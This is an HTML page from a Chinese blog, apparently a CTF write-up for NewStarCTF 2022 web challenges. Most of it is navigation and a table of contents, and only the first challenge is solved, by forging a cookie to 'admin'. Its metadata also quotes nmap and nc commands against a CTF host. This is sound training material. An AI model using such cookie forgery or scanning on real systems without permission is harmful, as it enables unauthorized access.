@@ -1,0 +1,1380 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>NEWSTARCTF2022-Web | 甜筒园</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="NEWSTARCTF2022-Web | 甜筒园">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="CITS1003 CTF[TOC] Emu Hack #1 - Backdoored根据题目描述，在端口61000到61500之间存在一个后门，使用nmap工具进行端口扫描: nmap 34.116.68.59 -p 61000-61550   发现在端口61337存在TCP服务，按照题目要求使用nc连接后发送EMU拿到flag nc 34.116.68.59 61337 EMU   Caffei">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CITS1003 CTF wp">
+<meta property="og:url" content="https://www.ttycp3.top/archives/f8a3bab8.html">
+<meta property="og:site_name" content="甜筒园">
+<meta property="og:description" content="CITS1003 CTF[TOC] Emu Hack #1 - Backdoored根据题目描述，在端口61000到61500之间存在一个后门，使用nmap工具进行端口扫描: nmap 34.116.68.59 -p 61000-61550   发现在端口61337存在TCP服务，按照题目要求使用nc连接后发送EMU拿到flag nc 34.116.68.59 61337 EMU   Caffei">
+<meta property="og:locale">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427185925654.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427190418683.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427194602383.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427194758409.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427195103342.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427200212033.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427200237861.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205355895.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205446268.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205546918.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205715007.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205814892.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205854735.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427210020443.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427210136578.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427215222685.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427230728660.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427230941388.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427232027952.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428085406716.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428085508241.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428084447502.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428143720534.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428103936811.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428104023953.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428104245922.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428142339778.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428142823544.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514145356203.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514145439171.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514151957982.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514152042484.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514171059762.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514173309181.png">
+<meta property="article:published_time" content="2024-05-09T08:21:59.504Z">
+<meta property="article:modified_time" content="2024-05-14T09:33:11.466Z">
+<meta property="article:author" content="ttycp3">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427185925654.png">
+
+
+<link rel="icon" href="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/logo.png">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/gruvbox-dark.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+    <script>        (function(){            var bp = document.createElement('script');            var curProtocol = window.location.protocol.split(':')[0];            if (curProtocol === 'https') {                bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';                    }            else {                bp.src = 'http://push.zhanzhang.baidu.com/push.js';            }            var s = document.getElementsByTagName("script")[0];            s.parentNode.insertBefore(bp, s);        })();    </script>  
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="http://q.qlogo.cn/headimg_dl?dst_uin=1004454362&amp;spec=640&amp;img_type=jpg"/>
+</a>
+<div class="author">
+    <span>ttycp3</span>
+</div>
+
+<div class="icon">
+    
+        
+            <a title="github"
+               href="https://github.com/ttycp3"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="csdn"
+               href="https://blog.csdn.net/qq_33814823"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-csdn"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="neteasemusic"
+               href="https://music.163.com/#/user/home?id=1765543783"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-neteasemusic"></use>
+                    </svg>
+                
+            </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="All">All
+            
+                <small>(32)</small>
+            
+        </div>
+    </li>
+    
+        
+            
+                <li>
+                    <div data-rel="Writeup">
+                        
+                        Writeup
+                        <small>(25)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="笔记">
+                        
+                        笔记
+                        <small>(4)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="工具">
+                        
+                        工具
+                        <small>(1)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="算法竞赛专题">
+                        
+                        算法竞赛专题
+                        <small>(2)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="32">
+<input type="hidden" id="yelog_site_word_count" value="40.6k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        Links
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">All</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>流量分析</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>命令执行</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>任意文件读取</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>杂项</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>CRLF Injection</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>gopher协议</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>grafana</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>JAVA安全</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>jwt伪造</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>pickle反序列化</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>session反序列化</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sql注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ssrf漏洞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>XPath注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xxe漏洞</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="All Writeup "
+           href="/archives/f8a3bab8.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CITS1003 CTF wp">CITS1003 CTF wp</span>
+            <span class="post-date" title="2024-05-09 16:21:59">2024/05/09</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/e228e2bf.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="XYCTF2024">XYCTF2024</span>
+            <span class="post-date" title="2024-04-28 14:40:53">2024/04/28</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/53f30b58.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="NCTF2023web（赛后复现）">NCTF2023web（赛后复现）</span>
+            <span class="post-date" title="2023-12-31 16:31:14">2023/12/31</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/3b79de97.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="SHCTF wp">SHCTF wp</span>
+            <span class="post-date" title="2023-10-02 13:25:28">2023/10/02</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/d4f5203b.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="0xGame2023 wp">0xGame2023 wp</span>
+            <span class="post-date" title="2023-10-01 14:16:22">2023/10/01</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/83697f53.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Moectf2023">Moectf2023</span>
+            <span class="post-date" title="2023-09-16 11:44:15">2023/09/16</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/7a95ce38.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="SYCTF2023wp">SYCTF2023wp</span>
+            <span class="post-date" title="2023-06-10 12:48:24">2023/06/10</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/1d622977.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="第16届ciscn初赛wp">第16届ciscn初赛wp</span>
+            <span class="post-date" title="2023-05-28 18:51:15">2023/05/28</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/7dc07b0.html"
+           data-tag="流量分析,杂项"
+           data-author="" >
+            <span class="post-title" title="第四届闽盾杯Misc流量分析">第四届闽盾杯Misc流量分析</span>
+            <span class="post-date" title="2023-05-25 14:23:16">2023/05/25</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/4524613a.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="ångstromCTF 2023">ångstromCTF 2023</span>
+            <span class="post-date" title="2023-04-25 15:17:57">2023/04/25</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/37321197.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="HDCTF2023">HDCTF2023</span>
+            <span class="post-date" title="2023-04-24 16:30:04">2023/04/24</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/3527c39a.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="第三届红明谷杯">第三届红明谷杯</span>
+            <span class="post-date" title="2023-04-19 14:18:45">2023/04/19</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/6ee431f.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="GDOUCTF2023">GDOUCTF2023</span>
+            <span class="post-date" title="2023-04-16 12:42:03">2023/04/16</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/e92ae896.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="HackPack CTF 2023">HackPack CTF 2023</span>
+            <span class="post-date" title="2023-04-15 16:32:49">2023/04/15</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/c603889a.html"
+           data-tag="pickle反序列化,jwt伪造"
+           data-author="" >
+            <span class="post-title" title="CISCN2019 华北赛区 Day1 ikun">CISCN2019 华北赛区 Day1 ikun</span>
+            <span class="post-date" title="2023-04-12 15:17:10">2023/04/12</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/b85a28bc.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CTFSHOW第三届愚人杯部分WP">CTFSHOW第三届愚人杯部分WP</span>
+            <span class="post-date" title="2023-04-02 19:28:10">2023/04/02</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/fcef946.html"
+           data-tag="文件上传,任意文件读取,JAVA安全"
+           data-author="" >
+            <span class="post-title" title="GKCTF2021 babycat">GKCTF2021 babycat</span>
+            <span class="post-date" title="2023-04-01 19:45:19">2023/04/01</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/56a79676.html"
+           data-tag="ssrf漏洞"
+           data-author="" >
+            <span class="post-title" title="GYCTF2020 Node Game">GYCTF2020 Node Game</span>
+            <span class="post-date" title="2023-03-21 16:21:32">2023/03/21</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/f06c7905.html"
+           data-tag="ssrf漏洞,gopher协议"
+           data-author="" >
+            <span class="post-title" title="2023数字中国创新大赛-数字网络安全人才挑战赛easy_curl">2023数字中国创新大赛-数字网络安全人才挑战赛easy_curl</span>
+            <span class="post-date" title="2023-03-15 17:45:23">2023/03/15</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/2e3a56ed.html"
+           data-tag="xxe漏洞"
+           data-author="" >
+            <span class="post-title" title="GoogleCTF2019 Quals Bnv">GoogleCTF2019 Quals Bnv</span>
+            <span class="post-date" title="2023-03-15 17:45:23">2023/03/15</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/32149828.html"
+           data-tag="ssrf漏洞,session反序列化,CRLF Injection"
+           data-author="" >
+            <span class="post-title" title="bestphp&#39;s revenge">bestphp&#39;s revenge</span>
+            <span class="post-date" title="2023-03-14 19:17:23">2023/03/14</span>
+        </a>
+        
+        
+        <a  class="All 笔记 "
+           href="/archives/54488cb7.html"
+           data-tag="XPath注入"
+           data-author="" >
+            <span class="post-title" title="Xpath笔记">Xpath笔记</span>
+            <span class="post-date" title="2023-03-11 21:17:23">2023/03/11</span>
+        </a>
+        
+        
+        <a  class="All 算法竞赛专题 "
+           href="/archives/68b41866.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="常用简单模板">常用简单模板</span>
+            <span class="post-date" title="2022-10-23 12:17:23">2022/10/23</span>
+        </a>
+        
+        
+        <a  class="All 算法竞赛专题 "
+           href="/archives/2bd6ac.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="从c升级到c++速成">从c升级到c++速成</span>
+            <span class="post-date" title="2022-10-20 13:47:23">2022/10/20</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/66731dbe.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="NEWSTARCTF2022-Web">NEWSTARCTF2022-Web</span>
+            <span class="post-date" title="2022-10-06 23:53:26">2022/10/06</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/ac4562c6.html"
+           data-tag="命令执行"
+           data-author="" >
+            <span class="post-title" title="ctfshow七夕杯wp">ctfshow七夕杯wp</span>
+            <span class="post-date" title="2022-08-06 17:17:23">2022/08/06</span>
+        </a>
+        
+        
+        <a  class="All 笔记 "
+           href="/archives/ec3e2815.html"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="Webshell笔记">Webshell笔记</span>
+            <span class="post-date" title="2022-05-13 21:17:23">2022/05/13</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/e9530a94.html"
+           data-tag="grafana"
+           data-author="" >
+            <span class="post-title" title="STARCTF2022 oh-my-grafana">STARCTF2022 oh-my-grafana</span>
+            <span class="post-date" title="2022-04-16 23:53:26">2022/04/16</span>
+        </a>
+        
+        
+        <a  class="All 笔记 "
+           href="/archives/1a0e10db.html"
+           data-tag="ssrf漏洞"
+           data-author="" >
+            <span class="post-title" title="SSRF笔记">SSRF笔记</span>
+            <span class="post-date" title="2022-03-30 21:47:23">2022/03/30</span>
+        </a>
+        
+        
+        <a  class="All 笔记 "
+           href="/archives/a00344c6.html"
+           data-tag="sql注入"
+           data-author="" >
+            <span class="post-title" title="SQL注入笔记">SQL注入笔记</span>
+            <span class="post-date" title="2022-03-24 20:17:23">2022/03/24</span>
+        </a>
+        
+        
+        <a  class="All 工具 "
+           href="/archives/7450bfcb.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="实用工具">实用工具</span>
+            <span class="post-date" title="2022-01-24 18:17:23">2022/01/24</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/bff3fd5a.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="攻防世界web新手区Writeup">攻防世界web新手区Writeup</span>
+            <span class="post-date" title="2022-01-16 18:17:23">2022/01/16</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-NEWSTARCTF2022新生赛" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">NEWSTARCTF2022-Web</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="Writeup">Writeup</a>
+            
+        </span>
+        
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2023-03-07 16:47:35'>2022-10-06 23:53</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>Count:3.7k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="跳转至评论区">
+            <a href="#comments">
+                Comment:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK1"><span class="toc-text">WEEK1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP"><span class="toc-text">HTTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Head-Header"><span class="toc-text">Head?Header!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%9C%9F%E7%9A%84%E4%BC%9A%E8%B0%A2"><span class="toc-text">我真的会谢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NotPHP"><span class="toc-text">NotPHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Word-For-You"><span class="toc-text">Word-For-You</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK2"><span class="toc-text">WEEK2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Word-For-You-2-Gen"><span class="toc-text">Word-For-You(2 Gen)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IncludeOne"><span class="toc-text">IncludeOne</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UnserializeOne"><span class="toc-text">UnserializeOne</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezAPI"><span class="toc-text">ezAPI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK3"><span class="toc-text">WEEK3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BabySSTI-One"><span class="toc-text">BabySSTI_One</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#multiSQL"><span class="toc-text">multiSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IncludeTwo"><span class="toc-text">IncludeTwo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Maybe-You-Have-To-think-More"><span class="toc-text">Maybe You Have To think More</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK4"><span class="toc-text">WEEK4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BabySSTI-Two"><span class="toc-text">BabySSTI_Two</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#So-Baby-RCE"><span class="toc-text">So Baby RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UnserialieThree"><span class="toc-text">UnserialieThree</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%88%E4%B8%80%E4%B8%AASQL"><span class="toc-text">又一个SQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rome"><span class="toc-text">Rome</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK5"><span class="toc-text">WEEK5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Give-me-your-photo-PLZ"><span class="toc-text">Give me your photo PLZ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BabySSTI-Three"><span class="toc-text">BabySSTI_Three</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unsafe-Apache"><span class="toc-text">Unsafe Apache</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#So-Baby-RCE-Again"><span class="toc-text">So Baby RCE Again</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><div class='inner-toc'><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK1"><span class="toc-text">WEEK1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP"><span class="toc-text">HTTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Head-Header"><span class="toc-text">Head?Header!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%9C%9F%E7%9A%84%E4%BC%9A%E8%B0%A2"><span class="toc-text">我真的会谢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NotPHP"><span class="toc-text">NotPHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Word-For-You"><span class="toc-text">Word-For-You</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK2"><span class="toc-text">WEEK2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Word-For-You-2-Gen"><span class="toc-text">Word-For-You(2 Gen)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IncludeOne"><span class="toc-text">IncludeOne</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UnserializeOne"><span class="toc-text">UnserializeOne</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezAPI"><span class="toc-text">ezAPI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK3"><span class="toc-text">WEEK3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BabySSTI-One"><span class="toc-text">BabySSTI_One</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#multiSQL"><span class="toc-text">multiSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IncludeTwo"><span class="toc-text">IncludeTwo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Maybe-You-Have-To-think-More"><span class="toc-text">Maybe You Have To think More</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK4"><span class="toc-text">WEEK4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BabySSTI-Two"><span class="toc-text">BabySSTI_Two</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#So-Baby-RCE"><span class="toc-text">So Baby RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UnserialieThree"><span class="toc-text">UnserialieThree</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%88%E4%B8%80%E4%B8%AASQL"><span class="toc-text">又一个SQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rome"><span class="toc-text">Rome</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK5"><span class="toc-text">WEEK5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Give-me-your-photo-PLZ"><span class="toc-text">Give me your photo PLZ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BabySSTI-Three"><span class="toc-text">BabySSTI_Three</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unsafe-Apache"><span class="toc-text">Unsafe Apache</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#So-Baby-RCE-Again"><span class="toc-text">So Baby RCE Again</span></a></li></ol></li></ol></div></p>
+<h2 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h2><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>​      题目要求GET传入一个name，POST传入一个key（元素审查在注释中找到），又提示你不是admin，查看cookie里user的值为<code>guest</code>,猜测需要把它改为<code>admin</code></p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210051908672.png" alt="WEEK1-HTTP"></p>
+<p>payload:</p>
+<pre><code>GET: /?name=admin
+POST: key=ctfisgood
+COOKIE: user=admin
+</code></pre>
